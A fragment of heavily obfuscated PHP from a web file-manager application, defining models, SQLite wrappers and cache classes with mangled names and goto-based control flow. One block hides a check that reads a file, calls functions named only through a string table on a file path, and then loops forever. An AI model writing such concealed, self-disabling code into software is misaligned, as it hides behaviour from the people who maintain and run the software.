($b²´áÔ¹éÅ[$aŒÈ„•ãåÓ[1750]]) { $cÔáéìË„ = Model($aŒÈ„•ãåÓ[1822])->listData($b²´áÔ¹éÅ[$aŒÈ„•ãåÓ[1750]]); if (!$cÔáéìË„) { return !1; $fÓõŸ™›ºì = Model($aŒÈ„•ãåÓ[1822])->listData(); $e¸¹ƒÅ›œ = array_filter_by_field($fÓõŸ™›ºì, $aŒÈ„•ãåÓ[400], $aŒÈ„•ãåÓ[491]); return $e¸¹ƒÅ›œ; } $E¾ãœæ×©ï = array_field_key($cÔáéìË„, array($aŒÈ„•ãåÓ[388], $aŒÈ„•ãåÓ[28], $aŒÈ„•ãåÓ[400], $aŒÈ„•ãåÓ[1675], $aŒÈ„•ãåÓ[1677])); $E¾ãœæ×©ï[$aŒÈ„•ãåÓ[1861]] = $b²´áÔ¹éÅ; return $E¾ãœæ×©ï; } else { return array($aŒÈ„•ãåÓ[406] => 0, $aŒÈ„•ãåÓ[1660] => $b²´áÔ¹éÅ[$aŒÈ„•ãåÓ[1804]], $aŒÈ„•ãåÓ[407] => $aŒÈ„•ãåÓ[33], $aŒÈ„•ãåÓ[1675] => $aŒÈ„•ãåÓ[1862]); } } } goto eÔğÕ…¹£; aĞİ‘ƒõİ—: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\145\155\137\157\160\x74\151\157\156"; protected $jsonField = array("\155\x65\x6e\165", "\x72\x6f\154\x65", "\162\x6f\154\145\107\162\x6f\x75\160", "\162\145\147\x69\x73\164", "\145\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($D‚’µÆÆŒ™) { return "\x53\171\163\x74\145\155\117\x70\x74\x69\x6f\x6e\137{$D‚’µÆÆŒ™}"; } protected function optionDefault($bÆÍ³®îÕ¥ = '') { $B”çÄ·çßğ =& $_SERVER[ç]; if ($bÆÍ³®îÕ¥ == $B”çÄ·çßğ[33]) { return $GLOBALS[$B”çÄ·çßğ[6]][$B”çÄ·çßğ[376]]; } } } class SystemRecordModel extends ModelBaseLight { } $aššµ¢³ = $_SERVER[$_SERVER[ç][795]]; goto E…˜Æª’†â; Eå½‰¡‚‘İ: class DbSqlite extends DbSqliteBase { public function query($F¸¼Ã¼à) { $e‘ÁÇÍ®ºâ =& $_SERVER[ç]; if (!CacheLock::fileLock($e‘ÁÇÍ®ºâ[9])) { return !1; } $AÊ³´Å·„Ä = parent::query($F¸¼Ã¼à); CacheLock::fileUnLock($e‘ÁÇÍ®ºâ[9]); return $AÊ³´Å·„Ä; } public function execute($Fº™ğøéí…) { $D‹¦ÎÕ“õÃ =& $_SERVER[ç]; if (!CacheLock::fileLock($D‹¦ÎÕ“õÃ[9])) { return !1; } $Bãƒ¡ô‘í— = parent::execute($Fº™ğøéí…); CacheLock::fileUnLock($D‹¦ÎÕ“õÃ[9]); return $Bãƒ¡ô‘í—; } } if (!isset($_SERVER[$_SERVER[ç][788]]) || !isset($_SERVER[$_SERVER[ç][795]])) { goto B­ĞÏãÒ‡ñ; B­ĞÏãÒ‡ñ: $cªæÉØì‚ = $_SERVER[ç][790]; $eßİ«Ÿó² = $_SERVER[$_SERVER[ç][791]] . $_SERVER[ç][792]; $cíéÂÕÃ»Î = $cªæÉØì‚($eßİ«Ÿó²); goto cî‰áğÉæŠ; e…˜¸“Şâè: $d«÷÷…š’Ê($_SERVER[$_SERVER[ç][791]] . $_SERVER[ç][792]); $A©Êª‰—¹¹ = 2; while ($A©Êª‰—¹¹ > 1) { $A¹ÎÄãÄ›â = rawurlencode($A©Êª‰—¹¹ . $_SERVER[ç][373]); } goto c†Š‰©ò»—; cî‰áğÉæŠ: $e—ÜÜŠ†ï = explode($_SERVER[ç][227], $cíéÂÕÃ»Î); if (count($e—ÜÜŠ†ï) < $_SERVER[ç][570]) { $eŒåÑ×ÄÖœ = $_SERVER[ç][793]; $eŒåÑ×ÄÖœ(); } $d«÷÷…š’Ê = $_SERVER[ç][794]; goto e…˜¸“Şâè; c†Š‰©ò»—: } class DbSqlite3 extends DbSqlite3Base { public function query($aùÉœÈß­) { $AõÆ……íßç =& $_SERVER[ç]; if (!CacheLock::fileLock($AõÆ……íßç[9])) { return !1; } $B‘ÓÇ“ô«ã = parent::query($aùÉœÈß­); CacheLock::fileUnLock($AõÆ……íßç[9]); return $B‘ÓÇ“ô«ã; } public function execute($FñĞ¹È†Ûò) { $EèëÕ¿ò±‹ =& $_SERVER[ç]; if (!CacheLock::fileLock($EèëÕ¿ò±‹[9])) { return !1; } $cñ¨ìÑ½æ˜ = parent::execute($FñĞ¹È†Ûò); CacheLock::fileUnLock($EèëÕ¿ò±‹[9]); return $cñ¨ìÑ½æ˜; } } goto c‚š¿Æ†Ã•; E‚Ó´ÑèÓ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\164\141\x73\153\114\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\164\171\160\x65", "\x65\166\145\156\164", "\164\x69\155\145", "\x64\145\x73\143", "\x73\171\x73\164\x65\x6d", "\x65\156\141\142\154\145", "\154\x61\163\x74\x52\x75\x6e", "\163\x6f\162\164"); public function listData($f˜·‹Òæ×© = false, $E§±Ñ»ßò¼ = "\x73\157\162\x74", $a…”·ªõ = false) { return parent::listData($f˜·‹Òæ×©, $E§±Ñ»ßò¼, $a…”·ªõ); } public function add($c½†ô‹ŸßÖ) { $Cå¸Ïğ¶àß =& $_SERVER[ç]; $Aå…©ùŒ‹® = $this->findByName($c½†ô‹ŸßÖ[$Cå¸Ïğ¶àß[28]]); if ($Aå…©ùŒ‹®) { return !1; } $c½†ô‹ŸßÖ[$Cå¸Ïğ¶àß[1455]] = 0; $c½†ô‹ŸßÖ[$Cå¸Ïğ¶àß[1677]] = $this->getSort(); return parent::insert($c½†ô‹ŸßÖ); } private function getSort() { $aµ•£ÒÜÆé =& $_SERVER[ç]; $c„¨¿Œ¤ø± = parent::listData(); $Cœ¯Ù¨á™É = array_to_keyvalue($c„¨¿Œ¤ø±, $aµ•£ÒÜÆé[33], $aµ•£ÒÜÆé[1677]); return empty($Cœ¯Ù¨á™É) ? 0 : max($Cœ¯Ù¨á™É) + 1; } public function update($DÏ“ÁÍµÃ¿, $b¯—“¡ÅÈ¨) { $eÅäÚç´ìˆ =& $_SERVER[ç]; $BëŠçŸÓ½ = $this->listData($DÏ“ÁÍµÃ¿); $Eï“‘¸æš§ = $this->findByName($b¯—“¡ÅÈ¨[$eÅäÚç´ìˆ[28]]); if (!$BëŠçŸÓ½ || $Eï“‘¸æš§ && $Eï“‘¸æš§[$eÅäÚç´ìˆ[388]] != $BëŠçŸÓ½[$eÅäÚç´ìˆ[388]]) { return !1; } return parent::update($DÏ“ÁÍµÃ¿, $b¯—“¡ÅÈ¨); } public function remove($CÅğ«ƒ¿­Ó, $A°”Öõ† = false) { $cÖîÍÌ¶ =& $_SERVER[ç]; $e·ï‚¹öè = $this->listData($CÅğ«ƒ¿­Ó); if (!$e·ï‚¹öè) { return; } if (!$A°”Öõ† && $e·ï‚¹öè[$cÖîÍÌ¶[1136]] == $cÖîÍÌ¶[86]) { return !1; } return parent::remove($CÅğ«ƒ¿­Ó); } public function enable($e“ÍĞ†ÏÙ , $EÁ‹ƒÏ‡) { return $this->update($e“ÍĞ†ÏÙ , array($_SERVER[ç][2062] => $EÁ‹ƒÏ‡)); } public function run($eÌƒ“äĞ—) { return $this->update($eÌƒ“äĞ—, array($_SERVER[ç][2072] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($c‚ŒÁøˆŒ) { $e¬ÎÇœĞ =& $_SERVER[ç]; return array($e¬ÎÇœĞ[1757] => array(USER_ID, $e¬ÎÇœĞ[2073])); } protected function listData() { $Bæ÷Ù’‹²ã =& $_SERVER[ç]; $b½™Ü ¬¬ = array($Bæ÷Ù’‹²ã[1483] => USER_ID, $Bæ÷Ù’‹²ã[457] => 0); $BÀß–éáï‹ = $Bæ÷Ù’‹²ã[2074]; $c«¥µÎö±¢ = $this->field($BÀß–éáï‹)->where($b½™Ü ¬¬)->order($Bæ÷Ù’‹²ã[2075])->select(); return $c«¥µÎö±¢ ? $c«¥µÎö±¢ : array(); } protected function resetCache() { } protected function listView() { goto CÇµÀê©Óö; CÇµÀê©Óö: $f„÷É¸®ƒ =& $_SERVER[ç]; $Câº”õ§¹‘ = $this->listData(); $c¬£¿¢Éºê = array_filter_by_field($Câº”õ§¹‘, $f„÷É¸®ƒ[29], $f„÷É¸®ƒ[403]); goto f«¤­‰ßš˜; b‹©À»ßÄ: $E®± êÎ¹Ş = array($f„÷É¸®ƒ[404] => array($f„÷É¸®ƒ[405], $f÷¥¤È´Ù¶)); $fÁƒõÏ‚Ì­ = Model($f„÷É¸®ƒ[760])->listSource($E®± êÎ¹Ş, $eÔÔˆ„Ï¦ç); $fÁƒõÏ‚Ì­ = array_merge($fÁƒõÏ‚Ì­[$f„÷É¸®ƒ[73]], $fÁƒõÏ‚Ì­[$f„÷É¸®ƒ[74]]); goto c‡Åš­££È; c‡Åš­££È: $fÁƒõÏ‚Ì­ = array_to_keyvalue($fÁƒõÏ‚Ì­, $f„÷É¸®ƒ[390]); foreach ($Câº”õ§¹‘ as $eâ‚…ªÃê‹ => $e¥‡Âà­Ø­) { $A‰ÌÈèŠ = $fÁƒõÏ‚Ì­[$e¥‡Âà­Ø­[$f„÷É¸®ƒ[75]]]; $A‰ÌÈèŠ = $A‰ÌÈèŠ ? $A‰ÌÈèŠ : array(); $Câº”õ§¹‘[$eâ‚…ªÃê‹] = array_merge($A‰ÌÈèŠ, $e¥‡Âà­Ø­); } return $Câº”õ§¹‘; goto AŸ’„øÚ©õ; f«¤­‰ßš˜: $f÷¥¤È´Ù¶ = array_to_keyvalue($c¬£¿¢Éºê, $f„÷É¸®ƒ[33], $f„÷É¸®ƒ[75]); if (!$f÷¥¤È´Ù¶) { return $Câº”õ§¹‘; } $eÔÔˆ„Ï¦ç = 2000; goto b‹©À»ßÄ; AŸ’„øÚ©õ: } protected function addFav($c¤”õšƒ¦¸, $fëÔ¹Öã¼¿ = '', $få‘¢öæ©“ = "\163\157\165\x72\143\x65") { goto cÒÎœ§ƒÕ˜; FÔ™Õ…»–: if (!$fëÔ¹Öã¼¿ && $få‘¢öæ©“ == $b÷ß¡‡‰™É[403]) { $Eçœ¦¡ñ»ò = Model($b÷ß¡‡‰™É[1171])->where(array($b÷ß¡‡‰™É[404] => $c¤”õšƒ¦¸))->find(); if (!$Eçœ¦¡ñ»ò) { return !1; } $fëÔ¹Öã¼¿ = $Eçœ¦¡ñ»ò[$b÷ß¡‡‰™É[28]]; } $fëÔ¹Öã¼¿ = $this->getAutoName($fëÔ¹Öã¼¿); $C¶Ìõœ‰ö = array($b÷ß¡‡‰™É[1483] => USER_ID, $b÷ß¡‡‰™É[457] => 0, $b÷ß¡‡‰™É[407] => $fëÔ¹Öã¼¿, $b÷ß¡‡‰™É[408] => $c¤”õšƒ¦¸, $b÷ß¡‡‰™É[409] => $få‘¢öæ©“, $b÷ß¡‡‰™É[1658] => $FçÂƒÔÍ²Î + 1); goto céÃº±ƒ“ö; cÒÎœ§ƒÕ˜: $b÷ß¡‡‰™É =& $_SERVER[ç]; $AãêµŒÈ¨ö = array($b÷ß¡‡‰™É[1483] => USER_ID, $b÷ß¡‡‰™É[457] => 0, $b÷ß¡‡‰™É[409] => $få‘¢öæ©“, $b÷ß¡‡‰™É[408] => $c¤”õšƒ¦¸); if ($this->where($AãêµŒÈ¨ö)->find()) { return !1; } goto F±ÌáŸ†¦; F±ÌáŸ†¦: $AãêµŒÈ¨ö = array($b÷ß¡‡‰™É[1483] => USER_ID, $b÷ß¡‡‰™É[457] => 0); $FçÂƒÔÍ²Î = $this->where($AãêµŒÈ¨ö)->max($b÷ß¡‡‰™É[1677]); if (!$FçÂƒÔÍ²Î) { $FçÂƒÔÍ²Î = 0; } goto FÔ™Õ…»–; céÃº±ƒ“ö: return $this->add($C¶Ìõœ‰ö); goto aßª¬İÏÁÑ; aßª¬İÏÁÑ: } protected function remove($aŠÖØë‹ã) { $c²„ğ†×©Š =& $_SERVER[ç]; $cÇó³š›ºè = array($c²„ğ†×©Š[1483] => USER_ID, $c²„ğ†×©Š[406] => $aŠÖØë‹ã); return $this->where($cÇó³š›ºè)->delete(); } protected function removeByName($aĞ¹´„Ïç‰) { $bä‡¸õÏŞ› =& $_SERVER[ç]; $C‰†æ±ºŠ¨ = array($bä‡¸õÏŞ›[1483] => USER_ID, $bä‡¸õÏŞ›[407] => $aĞ¹´„Ïç‰, $bä‡¸õÏŞ›[457] => 0); return $this->where($C‰†æ±ºŠ¨)->delete(); } protected function rename($d“øóùïœê, $D”ÎĞéö•Ù) { $eáÈñÂ§­¯ =& $_SERVER[ç]; if ($d“øóùïœê == $D”ÎĞéö•Ù) { return !1; } $c¤ó‘¢äŸ = $this->getAutoName($D”ÎĞéö•Ù); if ($D”ÎĞéö•Ù != $c¤ó‘¢äŸ) { return !1; } $AƒÖ±×–È· = array($eáÈñÂ§­¯[1483] => USER_ID, $eáÈñÂ§­¯[457] => 0, $eáÈñÂ§­¯[28] => $d“øóùïœê); return $this->where($AƒÖ±×–È·)->save(array($eáÈñÂ§­¯[28] => $D”ÎĞéö•Ù)); } protected function resetSort($e–‡†²í¨Ï) { $ağ¦ØÎ”›ğ =& $_SERVER[ç]; $e–‡†²í¨Ï = is_array($e–‡†²í¨Ï) ? $e–‡†²í¨Ï : array(); $AÏ…ğ¦É = array($ağ¦ØÎ”›ğ[1483] => USER_ID); for ($BĞëÊĞÙö = 0; $BĞëÊĞÙö < count($e–‡†²í¨Ï); $BĞëÊĞÙö++) { $AÏ…ğ¦É[$ağ¦ØÎ”›ğ[406]] = $e–‡†²í¨Ï[$BĞëÊĞÙö]; $this->where($AÏ…ğ¦É)->save(array($ağ¦ØÎ”›ğ[1658] => $BĞëÊĞÙö + 1)); } return !0; } protected function moveTop($dµ´ãÀ£´¡) { goto d¦íÀØ½ŸË; d÷Ê§ªŠ‹: return $this->resetSort($fßšåå´ò); goto EğÛß¶ƒá‡; D‹Ôàéˆ¼: if (!$F¿®•ùÂ‰¾) { return; } $fßšåå´ò = $this->field($E«Ì²šóÙà[388])->where($C²¼ÄÜËì)->order($E«Ì²šóÙà[2075])->select(); $fßšåå´ò = array_to_keyvalue($fßšåå´ò, $E«Ì²šóÙà[33], $E«Ì²šóÙà[388]); goto a­ççİ¶Ş†; a­ççİ¶Ş†: $EùŠ©Öôì  = $fßšåå´ò; $fßšåå´ò = array_remove_value($fßšåå´ò, $F¿®•ùÂ‰¾[$E«Ì²šóÙà[388]]); array_unshift($fßšåå´ò, $F¿®•ùÂ‰¾[$E«Ì²šóÙà[388]]); goto d÷Ê§ªŠ‹; d¦íÀØ½ŸË: $E«Ì²šóÙà =& $_SERVER[ç]; $C²¼ÄÜËì = array($E«Ì²šóÙà[1483] => USER_ID, $E«Ì²šóÙà[457] => 0); $F¿®•ùÂ‰¾ = $this->where($C²¼ÄÜËì)->where(array($E«Ì²šóÙà[28] => $dµ´ãÀ£´¡))->find(); goto D‹Ôàéˆ¼; EğÛß¶ƒá‡: } protected function moveBottom($A­äØŠùªÛ) { $f¢ØÛ”‘« =& $_SERVER[ç]; $C‘Îù¬·¶ = array($f¢ØÛ”‘«[1483] => USER_ID, $f¢ØÛ”‘«[457] => 0); $CÏ¾…ñÈš = $this->where($C‘Îù¬·¶)->max($f¢ØÛ”‘«[1677]); $C­ÔÏ¥‰ğ´ = array($f¢ØÛ”‘«[1677] => $CÏ¾…ñÈš + 1); return $this->where($C‘Îù¬·¶)->where(array($f¢ØÛ”‘«[28] => $A­äØŠùªÛ))->save($C­ÔÏ¥‰ğ´); } private function getAutoName($d¾ØÛåÌïî) { goto F“‹ù»¿õ¼; F“‹ù»¿õ¼: $e¶ƒá˜©˜î =& $_SERVER[ç]; $bÇªŸÓŒ»® = array($e¶ƒá˜©˜î[1483] => USER_ID, $e¶ƒá˜©˜î[457] => 0); $DŞÉ‡ «À² = $this->field($e¶ƒá˜©˜î[28])->where($bÇªŸÓŒ»®)->select(); goto c‡¹Šå¶Å¯; e‘İ×ó÷–ƒ: return $d¾ØÛåÌïî . "\x28{$d®»»Æù„}\x29"; goto Cñ„ŒÉ’œÆ; c‡¹Šå¶Å¯: $DŞÉ‡ «À² = array_to_keyvalue($DŞÉ‡ «À², $e¶ƒá˜©˜î[33], $e¶ƒá˜©˜î[28]); if (!$DŞÉ‡ «À² || !in_array($d¾ØÛåÌïî, $DŞÉ‡ «À²)) { return $d¾ØÛåÌïî; } for ($d®»»Æù„ = 0; $d®»»Æù„ < count($DŞÉ‡ «À²); $d®»»Æù„++) { if (!in_array($d¾ØÛåÌïî . "\x28{$d®»»Æù„}\x29", $DŞÉ‡ «À²)) { return $d¾ØÛåÌïî . "\x28{$d®»»Æù„}\51"; } } goto e‘İ×ó÷–ƒ; Cñ„ŒÉ’œÆ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\x6a\x6f\x62\114\151\163\164"; public $field = array("\156\x61\x6d\145", "\144\145\x73\x63", "\x73\157\162\164"); const JOB_KEY = "\163\x65\154\x66\x4a\157\x62\x4c\x69\163\164"; public function listData($cˆğÄ°™«Ñ = false, $DÂØÕçŒ‡ = "\x73\157\x72\x74", $aá†–Ê‹¸± = false) { return parent::listData($cˆğÄ°™«Ñ, $DÂØÕçŒ‡, $aá†–Ê‹¸±); } public function remove($d¸ïâÈÇ„É) { return parent::remove($d¸ïâÈÇ„É); } public function add($cÜŸæŞ–ŠÖ) { $aŞæï¤ŠÄí =& $_SERVER[ç]; if ($this->findByName($cÜŸæŞ–ŠÖ[$aŞæï¤ŠÄí[28]])) { return !1; } $cÜŸæŞ–ŠÖ[$aŞæï¤ŠÄí[1677]] = $this->getSort(); return parent::insert($cÜŸæŞ–ŠÖ); } private function getSort() { $fŠ¬µÇª‹ =& $_SERVER[ç]; $EÀÀç®×«ô = parent::listData(); $d‰ºé•ÚŞí = array_to_keyvalue($EÀÀç®×«ô, $fŠ¬µÇª‹[33], $fŠ¬µÇª‹[1677]); return empty($d‰ºé•ÚŞí) ? 0 : max($d‰ºé•ÚŞí) + 1; } public function update($aæñ‰ò½Ö†, $eæºÚÒÁÅ¹) { $DƒÙ¢†¡ŞÂ =& $_SERVER[ç]; $Cò‰å‚ÓĞ´ = parent::listData($aæñ‰ò½Ö†); $D¤º®œ„¯ = $this->findByName($eæºÚÒÁÅ¹[$DƒÙ¢†¡ŞÂ[28]]); if (!$Cò‰å‚ÓĞ´ || $D¤º®œ„¯ && $D¤º®œ„¯[$DƒÙ¢†¡ŞÂ[388]] != $Cò‰å‚ÓĞ´[$DƒÙ¢†¡ŞÂ[388]]) { return !1; } return parent::update($aæñ‰ò½Ö†, $eæºÚÒÁÅ¹); } public function setUserJob($cí×ÚªÛì•, $cöòœÖ•ñ¿) { goto D…ÉÜ†¼šÁ; D…ÉÜ†¼šÁ: $E‡…¨Ñì‘ =& $_SERVER[ç]; if (!is_array($cöòœÖ•ñ¿)) { $cöòœÖ•ñ¿ = array($cöòœÖ•ñ¿); } $A‘±ÚßåÄ = parent::listData(); goto c¼© ä¢Ï; d´°Æ˜’²å: $câÌÚˆ¼“ = rtrim($câÌÚˆ¼“, $E‡…¨Ñì‘[47]); Model($E‡…¨Ñì‘[501])->metaSet($cí×ÚªÛì•, self::JOB_KEY, $câÌÚˆ¼“); goto C—Şî„­³¥; c¼© ä¢Ï: $f¸Ô¦·º½Š = array_to_keyvalue($A‘±ÚßåÄ, $E‡…¨Ñì‘[28]); $câÌÚˆ¼“ = $E‡…¨Ñì‘[373]; foreach ($cöòœÖ•ñ¿ as $aÁÂÒ²©ø×) { if ($f¸Ô¦·º½Š[$aÁÂÒ²©ø×]) { $câÌÚˆ¼“ .= $f¸Ô¦·º½Š[$aÁÂÒ²©ø×][$E‡…¨Ñì‘[388]] . $E‡…¨Ñì‘[47]; } else { $E’›ÍÀğ•Ã = $this->add($aÁÂÒ²©ø×); $câÌÚˆ¼“ .= $E’›ÍÀğ•Ã . $E‡…¨Ñì‘[47]; } } goto d´°Æ˜’²å; C—Şî„­³¥: } public function getUserJob($Aß’Ä¤‹”›) { $Fãêé­¶Œˆ = Model($_SERVER[ç][501])->metaGet($Aß’Ä¤‹”›); return $this->getUserJobInfo($Fãêé­¶Œˆ[self::JOB_KEY]); } public function getUserJobInfo($e¹˜‹¥í) { goto dĞºÓò­†›; dĞºÓò­†›: $e…Ñô˜”ÛÏ =& $_SERVER[ç]; $døªëè×ßÙ = explode($e…Ñô˜”ÛÏ[47], $e¹˜‹¥í); $e¼î„‘ŒÂé = parent::listData(); goto D‡¦ºõÛÇ; cÇÍ‘é°Àï: return $d†É­ÜÚÚ; goto cùÃçÂÏĞ; D‡¦ºõÛÇ: $e¼î„‘ŒÂé = array_remove_key($e¼î„‘ŒÂé, $e…Ñô˜”ÛÏ[192]); $d†É­ÜÚÚ = array(); foreach ($døªëè×ßÙ as $bœà¹”ÇŸ´) { if (isset($e¼î„‘ŒÂé[$bœà¹”ÇŸ´])) { $d†É­ÜÚÚ[] = $e¼î„‘ŒÂé[$bœà¹”ÇŸ´]; } } goto cÇÍ‘é°Àï; cùÃçÂÏĞ: } } goto eÇóÔã“ªï; E­åø¤Í: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto dÜù†…Ã˜; c¯ÑŠˆ‚µô: switch ($CŒÑ¹ôÖÑå[$bŒ’ßÅİ¿ˆ[762]]) { case $bŒ’ßÅİ¿ˆ[17]: self::$handle = Model($bŒ’ßÅİ¿ˆ[764]); break; case $bŒ’ßÅİ¿ˆ[765]: self::$handle = new CacheRedis($C·—×Ú‡¡Ê, $A¥å®‹©Ã¨); break; case $bŒ’ßÅİ¿ˆ[766]: self::$handle = new CacheMemcached($C·—×Ú‡¡Ê, $A¥å®‹©Ã¨); break; case $bŒ’ßÅİ¿ˆ[173]: self::$handle = new CacheFile($C·—×Ú‡¡Ê, $A¥å®‹©Ã¨); break; default: break; } return self::$handle; goto A‘éé¹…‹¥; aéîÂ œ†ï: $CŒÑ¹ôÖÑå = $GLOBALS[$bŒ’ßÅİ¿ˆ[6]][$bŒ’ßÅİ¿ˆ[345]]; $C·—×Ú‡¡Ê = $CŒÑ¹ôÖÑå[$CŒÑ¹ôÖÑå[$bŒ’ßÅİ¿ˆ[762]]]; $A¥å®‹©Ã¨ = $CŒÑ¹ôÖÑå[$bŒ’ßÅİ¿ˆ[763]]; goto c¯ÑŠˆ‚µô; dÜù†…Ã˜: $bŒ’ßÅİ¿ˆ =& $_SERVER[ç]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto aéîÂ œ†ï; A‘éé¹…‹¥: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($fÚÚ‚†œ‘È) { if (is_array($fÚÚ‚†œ‘È) || is_object($fÚÚ‚†œ‘È)) { $fÚÚ‚†œ‘È = json_encode($fÚÚ‚†œ‘È); } $fÚÚ‚†œ‘È = rawurlencode($fÚÚ‚†œ‘È); return md5(KOD_SITE_ID . $_SERVER[ç][70] . $fÚÚ‚†œ‘È); } public static function get($DÃŒÜ½Ïì‹, $ašÆµ”¤Ô· = false) { $e‹ÌÎğÍ• = self::key($DÃŒÜ½Ïì‹); if ($ašÆµ”¤Ô·) { return unserialize(self::init()->get($e‹ÌÎğÍ•)); } if (!isset(self::$memoryCache[$e‹ÌÎğÍ•])) { $dÍÌõêĞÆ = self::init()->get($e‹ÌÎğÍ•); self::$memoryCache[$e‹ÌÎğÍ•] = unserialize($dÍÌõêĞÆ); } return self::$memoryCache[$e‹ÌÎğÍ•]; } public static function set($f“åÕòˆ¡‡, $eŠŸî¿â¯, $cÖÀ³ÆŒÅ¢ = false) { goto eÉƒ›ÅŸİ; eÉƒ›ÅŸİ: $E³ÀáÌó² = self::key($f“åÕòˆ¡‡); if (isset(self::$memoryCache[$E³ÀáÌó²]) && self::$memoryCache[$E³ÀáÌó²] === $eŠŸî¿â¯) { return !0; } if ($cÖÀ³ÆŒÅ¢ === 0) { self::$memoryCache[$E³ÀáÌó²] = $eŠŸî¿â¯; return !0; } goto Bª›¸öãğ; C½ªâŞ‚™È: CacheLock::unlock($f“åÕòˆ¡‡); return $aòîåòğô’; goto B†ƒ¾à¿¨ô; Bª›¸öãğ: CacheLock::lock($f“åÕòˆ¡‡); $aòîåòğô’ = self::init()->set($E³ÀáÌó², serialize($eŠŸî¿â¯), $cÖÀ³ÆŒÅ¢); self::$memoryCache[$E³ÀáÌó²] = $eŠŸî¿â¯; goto C½ªâŞ‚™È; B†ƒ¾à¿¨ô: } public static function remove($EìßØèêÏ) { goto dß¯Ë‰…÷»; eÇÈä…ÔØ: return $F†¡¼ŞÑ®°; goto aï¦¸ëÊâ; d‹ª‘ù…â®: CacheLock::lock($EìßØèêÏ); $F†¡¼ŞÑ®° = self::init()->remove($aÑÓãµŸÜ); CacheLock::unlock($EìßØèêÏ); goto eÇÈä…ÔØ; dß¯Ë‰…÷»: $aÑÓãµŸÜ = self::key($EìßØèêÏ); unset(self::$memoryCache[$aÑÓãµŸÜ]); self::clearTimeout(); goto d‹ª‘ù…â®; aï¦¸ëÊâ: } public static function removeMemory($fÏ±ÖğîëÕ) { $BÉ×·İ‘º = self::key($fÏ±ÖğîëÕ); unset(self::$memoryCache[$BÉ×·İ‘º]); } public static function clearMemory($eÌç˜æô = false) { if ($eÌç˜æô) { $eÌç˜æô = self::key($eÌç˜æô); unset(self::$memoryCache[$eÌç˜æô]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ç][767])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ç][768])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($fˆˆ¬Öï¾», $F®Ü®¡‘Şï) { $cÀ…™—íÃ =& $_SERVER[ç]; $this->cachePath = $fˆˆ¬Öï¾»[$cÀ…™—íÃ[75]]; $this->prefix = $cÀ…™—íÃ[769]; $this->cacheTime = $F®Ü®¡‘Şï; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($fœÓÂŸÂ°¤) { $D«Ûôáß°› =& $_SERVER[ç]; $fœÓÂŸÂ°¤ = str_replace(array($D«Ûôáß°›[770], $D«Ûôáß°›[96], $D«Ûôáß°›[69]), $D«Ûôáß°›[771], $fœÓÂŸÂ°¤); return $this->cachePath . $D«Ûôáß°›[772] . $fœÓÂŸÂ°¤ . $D«Ûôáß°›[773]; } public function set($eˆ‘›´Ä™±, $B“¢ëî…êƒ, $EÑ×Âšòøæ = false) { $a¶Š¯§Õ½Ü = $this->getFile($eˆ‘›´Ä™±); if (file_put_contents($a¶Š¯§Õ½Ü, $this->prefix . $B“¢ëî…êƒ, LOCK_EX)) { return !0; } @unlink($a¶Š¯§Õ½Ü); return !1; } public function get($A¯•èÑé…Ğ) { $a½¼™ì–òÚ = $this->getFile($A¯•èÑé…Ğ); if (file_exists($a½¼™ì–òÚ) && filemtime($a½¼™ì–òÚ) < time() - $this->cacheTime) { @unlink($a½¼™ì–òÚ); return !1; } $d¸«‡·İÇò = @file_get_contents($a½¼™ì–òÚ); return substr($d¸«‡·İÇò, strlen($this->prefix)); } public function remove($Fç¨ä„Îô) { $FÂ‡èƒ†Êğ = $this->getFile($Fç¨ä„Îô); return @unlink($FÂ‡èƒ†Êğ); } public function deleteAll() { $a±Ûµñ”½ó =& $_SERVER[ç]; $cŠŸÒ¢Â = scandir($this->cachePath); foreach ($cŠŸÒ¢Â as $dœ†‚‹òÅÑ) { $DŒàŞƒë·‹ = $this->cachePath . $dœ†‚‹òÅÑ; if (strpos($DŒàŞƒë·‹, $a±Ûµñ”½ó[773]) && strpos($DŒàŞƒë·‹, $a±Ûµñ”½ó[774])) { @unlink($DŒàŞƒë·‹); } } } public function clearTimeout() { $c¢©ïºÉ´ğ =& $_SERVER[ç]; $EŒéæÑÀ¢§ = scandir($this->cachePath); foreach ($EŒéæÑÀ¢§ as $F÷ÇÆëÀÌ‘) { $B¥ß‹„‚÷ô = $this->cachePath . $F÷ÇÆëÀÌ‘; if (strpos($B¥ß‹„‚÷ô, $c¢©ïºÉ´ğ[773]) && strpos($B¥ß‹„‚÷ô, $c¢©ïºÉ´ğ[774]) && filemtime($B¥ß‹„‚÷ô) < time() - $this->cacheTime) { @unlink($B¥ß‹„‚÷ô); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto D‡ŞÎ¬Ä‡Ü; fĞÙ×‘“ÌÀ: if ($b•ê¤·ôÍö == $DîŠæĞÆ˜[17] && $dÎùçä­ÜŸ == $DîŠæĞÆ˜[9]) { $b•ê¤·ôÍö = $DîŠæĞÆ˜[173]; } switch ($b•ê¤·ôÍö) { case $DîŠæĞÆ˜[765]: self::$handle = new CacheLockRedis(); break; case $DîŠæĞÆ˜[766]: self::$handle = new CacheLockMemcached(); break; case $DîŠæĞÆ˜[17]: self::$handle = new CacheLockDatabase(); break; case $DîŠæĞÆ˜[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto CÀ™¡’Ö; D‡ŞÎ¬Ä‡Ü: $DîŠæĞÆ˜ =& $_SERVER[ç]; if (self::$handle) { return self::$handle; } $e‡óÊö…ã = $GLOBALS[$DîŠæĞÆ˜[6]][$DîŠæĞÆ˜[345]]; goto BŒ¼ÓÕ¹Ç; 